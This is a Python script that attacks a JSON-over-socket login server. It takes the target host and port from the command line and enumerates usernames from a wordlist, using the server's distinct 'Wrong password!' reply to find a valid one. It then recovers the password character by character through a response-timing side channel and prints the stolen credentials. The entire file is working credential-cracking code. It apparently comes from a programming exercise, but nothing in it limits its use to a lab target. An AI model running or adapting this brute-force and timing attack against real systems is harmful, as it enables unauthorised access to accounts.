import sys
import socket
import json
import string
from datetime import datetime


def get_login(client_socket: socket):
    logins = set()
    with open("C:\\logins.txt", "r") as f:
        for line in f:
            logins.add(line.strip())
    for login in logins:
        request = json.dumps({"login": login, "password": " "}).encode()
        client_socket.send(request)
        response = client_socket.recv(1024).decode()
        if response == json.dumps({"result": "Wrong password!"}):
            return login


def get_password(client_socket: socket, login: str):
    symbols = string.ascii_letters + string.digits
    current_password = ""
    while True:
        for letter in symbols:
            try:
                start = datetime.now()
                request = json.dumps({"login": login, "password": current_password + letter}).encode()
                client_socket.send(request)
                response = client_socket.recv(1024).decode()
                finish = datetime.now()
                diff = finish - start
                if diff.microseconds >= 7000:
                    current_password += letter
                    break
                elif response == json.dumps({"result": "Connection success!"}):
                    return current_password + letter
            except (ConnectionAbortedError, ConnectionResetError):
                pass


def main():
    args = sys.argv
    hostname, port = args[1], int(args[2])
    address = (hostname, port)

    with socket.socket() as client_socket:
        client_socket.connect(address)
        login = get_login(client_socket)
        password = get_password(client_socket, login)
        print(json.dumps({"login": login, "password": password}))


if __name__ == "__main__":
    main()
